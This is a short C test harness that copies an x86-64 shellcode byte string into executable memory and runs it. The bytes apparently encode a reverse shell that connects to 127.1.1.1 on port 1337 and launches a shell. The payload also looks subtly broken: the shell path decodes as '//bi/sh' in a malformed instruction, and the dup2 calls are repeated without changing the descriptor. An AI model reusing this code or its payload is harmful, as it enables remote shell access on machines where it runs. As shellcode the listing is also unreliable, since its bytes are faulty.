#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
char shellcode[] = "\x48\x31\xc9\xb0\x29\x48\xff\xc1\x48\xff\xc1\x51\x5f\x48\x31\xc9\x6a\x01\x5e\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x0f\x05\x48\x89\xc7\x48\x31\xf6\x48\xc7\xc6\x01\x01\x01\x7f\x66\x68\x39\x05\x66\xc1\xe0\x08\x50\x48\x89\xe6\x6a\x10\x5a\x0f\x05\x6a\x21\x58\x48\x29\xd2\x0f\x05\x0f\x05\x0f\x05\x48\x31\xc0\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x2f\x73\x68\x50\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x48\x31\xff\x48\x31\xc0\xb0\x3c\x0f\x05";
void main() {
    printf("shellcode length: %u\n", strlen(shellcode));
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}


